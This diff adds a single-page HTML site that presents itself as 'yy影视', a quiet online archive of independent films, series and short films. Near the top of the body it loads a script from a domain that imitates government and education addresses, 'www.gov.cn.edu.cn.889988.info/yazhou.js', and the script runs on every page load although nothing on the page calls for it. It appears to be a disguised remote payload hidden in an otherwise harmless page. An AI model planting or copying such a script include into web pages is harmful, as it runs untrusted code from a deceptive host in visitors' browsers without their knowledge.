@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>yy影视｜在线光影档案馆：独立电影、剧集与短片策展入口</title>
+<meta name="description" content="yy影视不是一个普通播放页，而是一间持续更新的线上光影档案馆。这里收录冷门独立电影、高分剧集、导演剪辑与影像随笔，用更安静的方式帮你找到值得坐下来看的片子。访问站点：https://yyyingshi-app.github.io">
+<meta name="keywords" content="yy影视, 在线影视, 独立电影推荐, 剧集档案, 短片策展, 光影随笔, yyyingshi">
+<meta name="author" content="yy影视编辑部">
+<meta name="theme-color" content="#0b0b0f">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yy影视｜线上光影档案馆">
+<meta property="og:description" content="冷门片、老电影、剧集与影像随笔的策展入口。">
+<meta property="og:url" content="https://yyyingshi-app.github.io">
+<link rel="canonical" href="https://yyyingshi-app.github.io">
+<style>
+  :root{
+    --ink:#f3eee6;
+    --muted:#9a958c;
+    --bg:#0b0b0f;
+    --bg-soft:#131218;
+    --line:rgba(243,238,230,.12);
+    --accent:#e8493f;
+    --accent-soft:rgba(232,73,63,.16);
+    --serif:"Songti SC","Noto Serif SC",Georgia,"Times New Roman",serif;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+  body{
+    background:var(--bg);
+    color:var(--ink);
+    font-family:var(--sans);
+    line-height:1.75;
+    overflow-x:hidden;
+    padding:0 env(safe-area-inset-left) 0 env(safe-area-inset-right);
+  }
+  a{color:inherit;text-decoration:none}
+  img{max-width:100%;display:block}
+
+  .wrap{max-width:960px;margin:0 auto;padding:0 22px}
+
+  /* 顶部细线导航 */
+  .topbar{
+    position:sticky;top:0;z-index:20;
+    backdrop-filter:blur(10px);
+    background:linear-gradient(180deg,rgba(11,11,15,.92),rgba(11,11,15,.62));
+    border-bottom:1px solid var(--line);
+  }
+  .topbar .wrap{
+    display:flex;align-items:center;justify-content:space-between;
+    height:56px;
+  }
+  .brand{
+    font-family:var(--serif);
+    font-size:20px;letter-spacing:.04em;
+    display:flex;align-items:baseline;gap:8px;
+  }
+  .brand b{color:var(--accent);font-weight:700}
+  .brand small{font-size:11px;color:var(--muted);letter-spacing:.18em;text-transform:uppercase}
+  .nav{display:flex;gap:18px;font-size:14px;color:var(--muted)}
+  .nav a{padding:6px 2px;border-bottom:1px solid transparent;transition:.2s}
+  .nav a:hover{color:var(--ink);border-color:var(--accent)}
+
+  /* 开场 */
+  .hero{
+    position:relative;
+    padding:78px 0 54px;
+    border-bottom:1px solid var(--line);
+    background:
+      radial-gradient(120% 80% at 80% -10%,var(--accent-soft),transparent 60%),
+      linear-gradient(180deg,var(--bg-soft),var(--bg));
+  }
+  .kicker{
+    font-size:12px;letter-spacing:.34em;color:var(--muted);
+    text-transform:uppercase;margin-bottom:18px;
+  }
+  .hero h1{
+    font-family:var(--serif);
+    font-weight:700;
+    font-size:clamp(34px,7vw,62px);
+    line-height:1.08;
+    letter-spacing:.01em;
+  }
+  .hero h1 em{color:var(--accent);font-style:normal}
+  .hero p{
+    margin-top:22px;max-width:54ch;
+    color:#cfc9bf;font-size:clamp(15px,2.4vw,17px);
+  }
+  .meta-row{
+    margin-top:30px;display:flex;flex-wrap:wrap;gap:10px 26px;
+    font-size:13px;color:var(--muted);
+  }
+  .meta-row span b{color:var(--ink);font-weight:600}
+
+  /* 栏目：竖向时间轴式排布，不用三栏卡片 */
+  .section{padding:56px 0;border-bottom:1px solid var(--line)}
+  .sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:30px}
+  .sec-no{font-family:var(--serif);color:var(--accent);font-size:14px;letter-spacing:.2em}
+  .sec-head h2{font-size:clamp(22px,4vw,28px);font-family:var(--serif);font-weight:700}
+  .sec-head i{font-style:normal;color:var(--muted);font-size:13px}
+
+  .rail{display:grid;gap:0}
+  .entry{
+    display:grid;
+    grid-template-columns:84px 1fr auto;
+    gap:18px;align-items:start;
+    padding:20px 0;
+    border-top:1px dashed var(--line);
+  }
+  .entry:first-child{border-top:0}
+  .entry .yr{font-family:var(--serif);color:var(--muted);font-size:14px;padding-top:3px}
+  .entry h3{font-size:17px;font-weight:650;margin-bottom:6px}
+  .entry p{color:#bdb7ad;font-size:14.5px}
+  .tag{
+    align-self:center;
+    font-size:11px;letter-spacing:.12em;
+    color:var(--accent);
+    border:1px solid var(--accent-soft);
+    background:var(--accent-soft);
+    padding:5px 10px;border-radius:999px;white-space:nowrap;
+  }
+
+  /* 策展墙 */
+  .wall{display:flex;flex-wrap:wrap;gap:14px}
+  .cell{
+    flex:1 1 160px;
+    min-height:120px;
+    border:1px solid var(--line);
+    border-radius:14px;
+    padding:18px;
+    background:linear-gradient(160deg,var(--bg-soft),transparent);
+    transition:.25s;
+  }
+  .cell:hover{transform:translateY(-3px);border-color:rgba(232,73,63,.4)}
+  .cell b{font-family:var(--serif);font-size:18px;display:block;margin-bottom:8px}
+  .cell span{font-size:13px;color:var(--muted)}
+
+  /* 关于+地址 */
+  .about p{color:#c8c2b8;max-width:60ch}
+  .addr{
+    margin-top:24px;font-size:14px;color:var(--muted);
+    word-break:break-all;
+  }
+  .addr a{color:var(--ink);border-bottom:1px solid var(--accent)}
+
+  footer{padding:40px 0 60px;color:var(--muted);font-size:13px}
+  footer .wrap{display:flex;flex-wrap:wrap;justify-content:space-between;gap:12px}
+  footer b{color:var(--ink);font-weight:600}
+
+  @media (max-width:680px){
+    .nav{display:none}
+    .entry{grid-template-columns:1fr;gap:6px}
+    .entry .yr{padding-top:0}
+    .tag{justify-self:start}
+    .hero{padding:60px 0 40px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><b>yy影视</b><small>light archive</small></div>
+    <nav class="nav" aria-label="栏目导航">
+      <a href="#show">正在展映</a>
+      <a href="#library">片库策展</a>
+      <a href="#notes">影像随笔</a>
+      <a href="#about">关于档案室</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div class="kicker">online film & series archive</div>
+    <h1>在 <em>yy影视</em><br>重新遇见一部好片</h1>
+    <p>这里不堆排行榜，也不做信息流。yy影视把独立电影、剧集、短片与导演剪辑，整理成可以慢慢翻的线上光影档案。你只需要挑一个晚上，留下来看。</p>
+    <div class="meta-row">
+      <span>站点：<b>yyyingshi-app.github.io</b></span>
+      <span>内容：<b>电影 / 剧集 / 短片</b></span>
+      <span>更新：<b>每周策展</b></span>
+    </div>
+  </div>
+</section>
+
+<main>
+
+  <section class="section" id="show">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sec-no">01</span>
+        <h2>正在展映</h2>
+        <i>／ 本周片单</i>
+      </div>
+      <div class="rail">
+        <article class="entry">
+          <div class="yr">EP.42</div>
+          <div>
+            <h3>深夜放映：城市边缘的陌生人</h3>
+            <p>三部独立剧情短片连映，关于通勤、霓虹与没说出口的告别。</p>
+          </div>
+          <a class="tag" href="#">进入放映室</a>
+        </article>
+        <article class="entry">
+          <div class="yr">EP.41</div>
+          <div>
+            <h3>老电影修复：胶片里的雨</h3>
+            <p>选取 1980—2000 年间被低估的华语文艺片，重看镜头里的潮湿记忆。</p>
+          </div>
+          <a class="tag" href="#">查看片目</a>
+        </article>
+        <article class="entry">
+          <div class="yr">EP.40</div>
+          <div>
+            <h3>剧集深读：一季一封信</h3>
+            <p>慢节奏剧集拆解，不剧透，只谈叙事结构、声音设计与人物动机。</p>
+          </div>
+          <a class="tag" href="#">开始深读</a>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="library">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sec-no">02</span>
+        <h2>片库策展</h2>
+        <i>／ 按情绪分类，不按热度</i>
+      </div>
+      <div class="wall">
+        <div class="cell">
+          <b>雨后频道</b>
+          <span>安静、低饱和、适合独处的片</span>
+        </div>
+        <div class="cell">
+          <b>公路与夜车</b>
+          <span>流动感强的公路片与午夜电影</span>
+        </div>
+        <div class="cell">
+          <b>陌生小镇</b>
+          <span>地域质感强烈的独立制作</span>
+        </div>
+        <div class="cell">
+          <b>无声对话</b>
+          <span>靠画面讲故事的短片合集</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="notes">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sec-no">03</span>
+        <h2>影像随笔</h2>
+        <i>／ 为什么这样选片</i>
+      </div>
+      <div class="rail">
+        <article class="entry">
+          <div class="yr">NOTE</div>
+          <div>
+            <h3>我们为什么不做好评榜</h3>
+            <p>高分不等于适合今晚。yy影视更关心你当下的状态，而不是算法眼里的“完播率”。</p>
+          </div>
+          <a class="tag" href="#">读随笔</a>
+        </article>
+        <article class="entry">
+          <div class="yr">NOTE</div>
+          <div>
+            <h3>胶片颗粒是一种语气</h3>
+            <p>聊修复版、噪点、字幕间距，以及为什么有些片不该被“高清化”得太干净。</p>
+          </div>
+          <a class="tag" href="#">读随笔</a>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section about" id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="sec-no">04</span>
+        <h2>关于档案室</h2>
+        <i>／ 关于 yy影视</i>
+      </div>
+      <p>
+        yy影视是一份长期更新的线上影像档案。我们没有首页弹窗、没有自动播放下一集的焦虑，
+        只想把“值得看的片子”放进同一个安静的空间。所有片单由编辑人工策展，
+        涵盖独立电影、剧集、短片与影像评论。
+      </p>
+      <p class="addr">
+        常驻地址：<a href="https://yyyingshi-app.github.io">https://yyyingshi-app.github.io</a><br>
+        站内导航：展映 · 片库 · 随笔 · 档案室
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>© <b>yy影视</b> 光影档案馆 · 策展式影视入口</span>
+    <span>托管于 GitHub Pages · 单页静态站点</span>
+  </div>
+</footer>
+
+</body>
+</html>
